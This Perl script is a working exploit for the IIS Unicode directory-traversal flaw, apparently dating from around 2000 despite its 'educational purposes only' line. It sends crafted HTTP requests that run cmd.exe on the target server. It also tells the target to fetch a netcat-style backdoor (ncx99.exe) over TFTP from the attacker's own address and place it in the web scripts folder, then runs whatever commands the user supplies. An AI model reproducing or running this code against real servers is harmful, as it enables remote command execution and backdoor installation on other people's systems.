#!/usr/bin/perl
# This is for educational purpose's only!
# WHO LET THEM DOGS OUT!
# Use uni.pl first to see if this is a vulnerable server!
# Based of the script unicodeexecute.pl from Roelof Temmngh
# Files=uniexe.pl,uni.pl,readme.file,tftpd32.exe,exploit.readme

use Socket;

if ($#ARGV<0) {die "Usage: uniexe.pl IP:port command\n";}
($host,$port)=split(/:/,@ARGV[0]);
$target = inet_aton($host);


$failed=1;
$command="dir";
@results=sendraw("GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+$command HTTP/1.0\r\n\r\n\cls");
foreach $line (@results){
 if ($line =~ /nit.exe/) {$failed=0;}
}
$failed2=1;
if ($failed==1) { 
 
 #You need to change the xxx.xxx.xxx.xxx to your ip address. Duh!
 $command="tftp -i xxx.xxx.xxx.xxx GET ncx99.exe c:\\inetpub\\scripts\\nit.exe";
 $command=~s/ /\%20/g;
 @results2=sendraw("GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+$command HTTP/1.0\r\n\r\n");
 foreach $line2 (@results2){
  if (($line2 =~ /nit.exe/ )) {$failed2=0;}
 }
}  


$command=@ARGV[1];
print "\n
Hit CTRL-C if this is Hanging";

$command=~s/ /\%20/g;
my @results=sendraw("GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+$command HTTP/1.0\r\n\r\n");
print @results;

# ------------- Sendraw - thanx RFP rfp@wiretrip.net
sub sendraw {   # this saves the whole transaction anyway
        my ($pstr)=@_;
        socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||2) ||
                die("Socket problems\n");
        if(connect(S,pack "SnA4x8",2,$port,$target)){
                my @in;
                select(S);      $|=1;   print $pstr;
                while(<S>){ push @in, $_;}
                select(STDOUT); close(S); return @in;
        } else { die("Can't connect...\n"); }
        
}
# NIT IN THE YEAR 2000


